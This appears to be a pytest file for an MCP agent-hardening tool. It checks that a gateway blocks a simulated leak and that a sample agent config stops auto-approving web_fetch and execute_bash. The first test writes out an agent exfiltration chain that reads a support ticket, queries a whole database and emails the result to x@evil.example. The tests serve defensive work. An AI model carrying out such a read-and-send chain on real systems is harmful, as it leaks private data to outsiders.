import asyncio
import json
import pathlib
import sys

from mcp.client.client import Client
from mcp.client.stdio import StdioServerParameters

from reach import harden
from reach.db import connect


def test_hardened_config_actually_blocks(tmp_path, monkeypatch):
    """Plan -> apply -> launch the PATCHED config's gateway entry -> the leak is blocked."""
    outbox = tmp_path / "outbox.jsonl"
    db = tmp_path / "h.db"
    monkeypatch.setenv("REACH_OUTBOX", str(outbox))
    mock = lambda k: {"command": sys.executable, "args": ["-m", "reach.mock_servers", k]}  # noqa: E731
    cfg = tmp_path / "mcp.json"
    cfg.write_text(json.dumps({"name": "laptop", "mcpServers": {
        "zendesk": mock("zendesk"), "postgres": mock("postgres"), "gmail": mock("gmail")}}))
    g = connect("harden_t", path=str(db))
    rep = harden.plan(g, str(cfg), gateway_cmd=f"{sys.executable} -m reach.gateway")
    assert rep["paths"] >= 1 and rep["capabilities_removed"] == 0
    assert [e["kind"] for e in rep["edits"]] == ["route-via-gateway"]
    assert "-    \"zendesk\"" in rep["diff"]

    res = harden.apply(g, rep, actor="test")
    assert res["applied"] and (tmp_path / "mcp.pre-reach.json").exists()
    patched = json.loads(cfg.read_text())["mcpServers"]
    assert list(patched) == ["reach-gateway"]
    assert g.ro_query("MATCH (r:Remediation)-[:ON]->(:Agent {name:'laptop'}) RETURN count(r)").result_set == [[1]]

    spec = patched["reach-gateway"]
    env = {"PATH": "", "HOME": str(tmp_path), "REACH_OUTBOX": str(outbox), "REACH_NO_DOTENV": "1",
           "REACH_DB_PATH": str(tmp_path / "gw.db")}
    import os
    env["PATH"] = os.environ["PATH"]

    async def run():
        async with Client(StdioServerParameters(command=spec["command"], args=spec["args"] + ["--task", "h1"], env=env)) as c:
            await c.call_tool("zendesk__get_ticket", {"id": 4521})
            await c.call_tool("postgres__query", {"sql": "select *"})
            r = await c.call_tool("gmail__send_email", {"to": "x@evil.example", "subject": "s", "body": "b"})
            assert r.is_error and "BLOCKED" in r.content[0].text

    asyncio.run(run())
    assert not outbox.exists()
    g.delete()


def test_kiro_agent_auto_approval_is_removed_from_the_send_leg(tmp_path):
    src = pathlib.Path(__file__).resolve().parents[1] / "examples/sample_setup/kiro_research_agent.json"
    cfg = tmp_path / "agent.json"
    cfg.write_text(src.read_text())
    g = connect("harden_k", path=str(tmp_path / "k.db"))
    rep = harden.plan(g, str(cfg))
    assert rep["severity_before"] == {"all-legs-auto-approved": 1}
    ra = next(e for e in rep["edits"] if e["kind"] == "require-approval")
    assert set(ra["tools"]) == {"web_fetch", "execute_bash"}
    assert rep["after"] == {"human-confirms-send": 1}
    assert json.loads(cfg.read_text()) == json.loads(src.read_text())  # dry run wrote nothing
    g.delete()
